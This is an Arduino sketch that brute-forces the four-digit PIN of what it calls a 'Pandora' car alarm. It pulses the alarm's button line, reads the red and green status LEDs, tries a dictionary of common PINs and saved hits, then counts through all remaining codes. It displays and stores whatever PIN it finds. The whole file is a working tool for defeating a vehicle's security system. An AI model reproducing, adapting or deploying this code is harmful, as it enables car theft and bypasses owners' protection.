/*
 Name:		carAlramBrute.ino
 Created:	28.01.2018 19:01:59
 Author:	misha
*/
#include <LiquidCrystal.h>
#include <EEPROM.h>
short dict[656] =
{
	1111,2222,3333,4444,5555,6666,7777,8888,9999,0000,
	1234,2345,3456,4567,5678,6789,7890,
	4321,5432,6543,7654,8765,9876,987,
	1281,2756,8765,
	1212,1313,1414,1515,1616,1717,1818,1919,1010,
	2323,2424,2525,2626,2727,2828,2929,
	3131,3232,3434,3535,3636,3737,3838,
	1984,1983,1982,1981,1980,1979,1978,1977,1976,1975,1974,1973,1972,1971,1970,
	1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2011,2012,2013,2014,2015,2016,2017,2018,2019,2020,2021,2022,2023,2024,2025,
	-1
};




const int BUT_START = 6;
const int BUTTON = 3;
const int RED = 4;
const int GREEN = 5;
const short ptrLastPsw = 1015;
const short ptrMaxEepromDict = 1012;
LiquidCrystal lcd(11, 12, 10, 9, 8, 7);
//				  RS  E   D4  D5 D6 D7
bool enterPas(short a);
short lastConstDict = 0;
short dictLength = 0;
short lastEepromDict = 0;
short pasW = 0;

void eeprom_write_short(short adrr,short value);
short eeprom_read_short(short adrr);
int compare(const void * x1, const void * x2)   // функция сравнения элементов массива
{
	return (*(int*)x2 - *(int*)x1);              // если результат вычитания равен 0, то числа равны, < 0: x1 < x2; > 0: x1 > x2
}
void setup() {
	Serial.begin(115200);
	pinMode(13, OUTPUT);
	pinMode(BUTTON, OUTPUT);
	pinMode(RED, INPUT);
	pinMode(GREEN, INPUT);
	pinMode(BUT_START, INPUT);
	digitalWrite(BUTTON, 0);
	lcd.begin(16, 2);
//	eeprom_write_short(0, -1);
}

// the loop function runs over and over again until power down or reset
void loop() {
	lcd.clear();
	lcd.print("Pandora Brute");
	lcd.setCursor(0, 1);
	lcd.print("Last passw: ");
	lcd.print(eeprom_read_short(ptrLastPsw));
	Serial.print("Last passw: ");
	Serial.println(eeprom_read_short(ptrLastPsw));
	while (!digitalRead(BUT_START));
	delay(500);
	//while (digitalRead(BUT_START));
	lcd.clear();
	lcd.print("Cheking...");
	digitalWrite(BUTTON, 1);
	delay(200);
	long tempMil = millis();
	while (!(digitalRead(GREEN) || digitalRead(RED))) {
		if (millis() - tempMil > 1000) {
			digitalWrite(BUTTON, 0);
			lcd.clear();
			lcd.print("Error....");
			lcd.setCursor(0, 1);
			lcd.print("Wait 7sec");
			delay(7500);
			return;
		}
	};
	digitalWrite(BUTTON, 0);
	lcd.clear();
	lcd.print("All OK Wait 7sec");
	delay(7500);
	if (digitalRead(BUT_START)) {
		Serial.println("Only BruteForce all pins");
		lcd.clear();
		lcd.print("Working... full");
		for (short i = 9999; i >= 0; --i) {
			lcd.setCursor(0, 1);
			if (enterPas(i)) {
				Serial.print("lastEepromDict");
				Serial.println(((int)lastEepromDict));
				if (lastEepromDict < ptrMaxEepromDict) {
					Serial.println("Writing....");
					eeprom_write_short(lastEepromDict, i);
					eeprom_write_short(lastEepromDict + 2, -1);
				}
				lcd.clear();
				lcd.print("Found!!!");
				lcd.setCursor(0, 1);
				lcd.print("Passw: ");
				lcd.print(i);
				eeprom_write_short(ptrLastPsw, i);//writeLast Password
				Serial.println("password found! It's");
				Serial.println(((int)i));
				while (digitalRead(BUT_START));
				return;
			}
			delay(5100);
		}
		lcd.clear();
		lcd.print("Pasw didn't find");
		Serial.println("password didn't find");
		while (digitalRead(BUT_START));

	}
	for (lastConstDict = 0; dict[lastConstDict] != -1; lastConstDict++);//find last in dict
	short dataRead = eeprom_read_short(0);
	Serial.println("Saved pasw");
	for (lastEepromDict = 2; dataRead != -1; lastEepromDict += 2)//add eeprom to end of dict
	{
		dict[lastConstDict] = dataRead;
		Serial.println(dataRead);
		lastConstDict++;
		dataRead = eeprom_read_short(lastEepromDict);
	}
	lastEepromDict -= 2;
	dict[lastConstDict] = -1;


	Serial.println("Begin BruteForce with dictionary");

	for (short i = 0; dict[i] != -1; i++) {//BruteForce with dictionary
		lcd.clear();
		lcd.print("Working... dict");
		lcd.setCursor(0, 1);
		if (enterPas(dict[i])) {
			Serial.println("password found! In dictionary It's");
			Serial.println(((int)dict[i]));
			eeprom_write_short(ptrLastPsw, dict[i]);//writeLast Password
			lcd.clear();
			lcd.print("Found in dict!!!");
			lcd.setCursor(0, 1);
			lcd.print("Passw: ");
			lcd.print(dict[i]);
			while (digitalRead(BUT_START));
			return;
		}
		dictLength++;
		delay(5100);
	}

	qsort(dict, dictLength, sizeof(short), compare);
	Serial.println("Begin BruteForce all pins");
	dictLength = 0;
	short j = 0;
	lcd.clear();
	lcd.print("Working... others");
	for (short i = 9999; i >= 0; i--) {
		if (dict[j] == i) {
			Serial.print("Skip.............");
			Serial.println(((int)j));
			j++;
			continue;
		}
		lcd.setCursor(0, 1);
		if (enterPas(i)) {
			Serial.print("lastEepromDict");
			Serial.println(((int)lastEepromDict));
			if (lastEepromDict < ptrMaxEepromDict) {
				Serial.println("Writing....");
				eeprom_write_short(lastEepromDict, i);
				eeprom_write_short(lastEepromDict + 2, -1);
			}
			lcd.clear();
			lcd.print("Found!!!");
			lcd.setCursor(0, 1);
			lcd.print("Passw: ");
			lcd.print(i);
			eeprom_write_short(ptrLastPsw, i);//writeLast Password
			Serial.println("password found! It's");
			Serial.println(((int)i));
			while (digitalRead(BUT_START));
			return;
		}
		delay(5100);
	}
	lcd.clear();
	lcd.print("Pasw didn't find");
	Serial.println("password didn't find");
	while (digitalRead(BUT_START));
	
}
bool enterPas(short a) {
	char m[4] = {0}, i = 3;
	while (a>0)
	{
		m[i] = a % 10;
		a = a / 10;
		i--;
	}

	for (i = 0; i < 4; i++) {
		Serial.print(((int)m[i]));
		lcd.print(((int)m[i]));
	}
	for (i=0; i < 4; i++) {
		if (m[i] == 0)
			m[i] = 10;
		for (char j = 0; j < m[i]; j++) {
			digitalWrite(BUTTON, 1);
			while (!(digitalRead(GREEN) || digitalRead(RED)));
			delay(100);
			digitalWrite(BUTTON, 0);
			while ((digitalRead(GREEN) || digitalRead(RED)));
			delay(100);
		}
		while (!(digitalRead(GREEN) || digitalRead(RED)));
		while (digitalRead(GREEN) || digitalRead(RED)) {
			if (i == 3)
				if (digitalRead(GREEN)) {
					Serial.println("True PAS");
					return true;
				}
		}
	}
	Serial.println("Fail");
	return false;
}
void eeprom_write_short(short adrr,short value) {
	EEPROM.update(adrr, lowByte(value));
	EEPROM.update(adrr + 1, highByte(value));
}
short eeprom_read_short(short adrr) {
	return word(EEPROM.read(adrr+1), EEPROM.read(adrr));
}